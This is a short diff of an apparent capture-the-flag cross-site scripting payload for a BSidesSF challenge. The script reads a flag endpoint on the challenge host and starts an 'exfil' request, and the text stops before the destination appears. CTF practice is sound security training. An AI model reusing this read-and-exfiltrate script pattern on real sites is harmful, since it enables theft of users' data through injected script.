@@ -1,5 +1,5 @@
 var xhr = new XMLHttpRequest();
-xhr.open('GET', '/xss-two-flag', true);
+xhr.open('GET', 'https://web-tutorial-2-9fec29fc.challenges.bsidessf.net/xss-two-flag', true);
 xhr.onload = function() {
   var flag = xhr.responseText;
   var exfil = new XMLHttpRequest();
